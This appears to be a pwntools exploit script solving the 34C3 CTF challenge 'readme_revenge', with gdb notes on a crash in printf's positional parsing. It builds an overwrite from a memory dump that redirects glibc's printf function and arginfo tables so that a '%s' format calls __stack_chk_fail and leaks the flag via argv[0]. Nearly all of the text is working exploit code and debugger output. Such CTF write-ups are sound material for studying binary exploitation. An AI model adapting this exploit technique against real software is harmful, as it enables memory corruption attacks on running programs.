# -*- coding: utf-8 -*-

import sys
from pwn import *
from binascii import unhexlify

"""
$ python -c 'print "A"*3000' | ./readme_revenge
$ gdb ./readme_revenge ./core
$ 
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000000000045ad64 in __parse_one_specmb ()

gef➤  bt
#0  0x000000000045ad64 in __parse_one_specmb ()
#1  0x0000000000443153 in printf_positional ()
#2  0x0000000000446ed2 in vfprintf ()
#3  0x0000000000407a74 in printf ()
#4  0x0000000000400a56 in main ()

gef➤  print $rip
$1 = (void (*)()) 0x45ad64 <__parse_one_specmb+1300>

gef➤  disass $rip
Dump of assembler code for function __parse_one_specmb:
... 
   0x000000000045ad53 <+1283>:  jmp    0x45ab95 <__parse_one_specmb+837>
   0x000000000045ad58 <+1288>:  nop    DWORD PTR [rax+rax*1+0x0]
   0x000000000045ad60 <+1296>:  movzx  edx,BYTE PTR [r10]
=> 0x000000000045ad64 <+1300>:  cmp    QWORD PTR [rax+rdx*8],0x0
   0x000000000045ad69 <+1305>:  je     0x45a944 <__parse_one_specmb+244>
   0x000000000045ad6f <+1311>:  lea    rdi,[rsp+0x8]
   0x000000000045ad74 <+1316>:  mov    rsi,rbx
... 

gef➤  print $rax
$2 = 0x4141414141414141

gef➤  print $rdx
$3 = 0x73
"""

r = process('./readme_revenge')
#r = gdb.debug('./readme_revenge', '''
#b *0x400a3e
#continue
#'''
#)

lines = [line.rstrip('\n') for line in open('memdump')]

'''
gef➤  x __stack_chk_fail
0x4359b0 <__stack_chk_fail_local>:      0x08ec8348
hex(ord("s")) == 0x73 ($rdx)
0x6b7424 + 0x73*8 == 0x6b77bc

gef➤  x/s 0x6b4040
0x6b4040 <flag>:        "34C3_", 'X' <repeats 30 times>
'''

'''
# ARGV --> ARGV[0]
0x6b7980 <__libc_argv>: 0x90    0x79    0x6b    0x00    0x00    0x00    0x00    0x00

# ARGV[0] --> "34C3_XXX..."
0x6b7990 <__gconv_lock>:        0x40    0x40    0x6b    0x00    0x00    0x00    0x00    0x00

# __printf_modifier_func_ptr_tbl['s'] --> __stack_chk_fail()
0x6b77b8 <_dl_static_dtv+920>:  0x00    0x00    0x00    0x00    0xB0    0x59    0x43    0x00
0x6b77c0 <_dl_static_dtv+928>:  0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

# __printf_modifier_func_ptr_tbl --> 0x6b7424
0x6b7a28 <__printf_function_table>:     0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00

# __printf_modifier_func_ptr_tbl --> 0x6b7424
0x6b7aa8 <__printf_arginfo_table>:      0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
'''

overwrite = ''
for l in lines:
    a = l.split()
    b = a[-8:]
    for c in b:
        d = c.replace('0x','')
        e = unhexlify(d)
        if e == '\x09' or e == '\x0a' or e == '\x0b' or e == '\x0c' or e == '\x0d' or e == '\x20':
            print "[*] Found delimeter 0x%02X" % ord(e)
            e = '\x41'
        overwrite += e

r.send(overwrite + '\n')

print (r.recv())
